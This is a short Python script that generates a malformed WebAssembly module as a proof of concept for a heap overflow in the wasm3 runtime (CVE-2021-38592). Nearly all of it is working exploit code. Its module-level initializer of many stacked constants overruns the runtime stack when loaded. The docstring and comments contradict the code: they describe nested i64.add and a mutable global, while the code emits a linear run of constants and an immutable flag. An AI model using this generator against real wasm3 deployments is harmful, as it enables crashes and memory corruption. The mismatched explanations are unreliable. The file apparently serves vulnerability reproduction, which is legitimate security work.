"""Generate a minimal .wasm PoC for wasm3 CVE-2021-38592.

The vulnerable code path (fixed upstream in commit 8f3986a, "TouchSlot should
track slots outside of functions") fails to track the maximum stack height of
module-level (global initializer) code, because TouchSlot only updated
maxStackSlots when o->function was set.  A deeply nested constant expression
in a global initializer therefore emits op_Const64 writes past the runtime
stack frame at module load time.

The module below declares one i64 global whose initializer is a right-leaning
tree of `i64.add` over `i64.const 1` leaves.  Each nesting level keeps one
more operand live on the compiler's stack, so depth N needs a runtime stack
of ~N slots; on the vulnerable build the frame is sized from maxStackSlots==0
and the writes overflow the heap buffer.

Usage:
    python gen_wasm3_poc.py <depth> <out.wasm>
"""
from __future__ import annotations

import struct
import sys

# wasm binary encodings
WASM_MAGIC = b"\x00asm"
WASM_VERSION = b"\x01\x00\x00\x00"
SEC_TYPE = 1
SEC_GLOBAL = 6
SEC_NAME = 0
VAL_I64 = 0x7E
GLOBAL_MUT_CONST = 0x00
OP_I64_CONST = 0x42
OP_I64_ADD = 0x7C
OP_END = 0x0B


def uleb(n: int) -> bytes:
    out = bytearray()
    while True:
        b = n & 0x7F
        n >>= 7
        if n:
            out.append(b | 0x80)
        else:
            out.append(b)
            return bytes(out)


def section(sid: int, payload: bytes) -> bytes:
    return bytes([sid]) + uleb(len(payload)) + payload


def global_section(depth: int) -> bytes:
    # one global: (global (mut i64) <init-expr>)
    # Module-level expressions are restricted to const/getGlobal/end, so the
    # trigger is a *linear* sequence of i64.const pushes: with the vulnerable
    # build TouchSlot does not track maxStackSlots when function==NULL, the
    # stack-overflow check in EvaluateExpression is skipped (maxStackSlots==0),
    # and RunCode executes every i64.const as op_Const64 writing past the
    # fixed-size runtime stack (default 64 KiB / 8192 slots).
    body = uleb(1)
    body += bytes([VAL_I64, GLOBAL_MUT_CONST])
    for _ in range(depth):
        body += bytes([OP_I64_CONST]) + uleb(1)
    body += bytes([OP_END])
    return section(SEC_GLOBAL, body)


def main() -> None:
    depth = int(sys.argv[1])
    out_path = sys.argv[2]
    mod = WASM_MAGIC + WASM_VERSION + global_section(depth)
    with open(out_path, "wb") as f:
        f.write(mod)
    print(f"wrote {out_path}: depth={depth}, size={len(mod)} bytes")


if __name__ == "__main__":
    main()
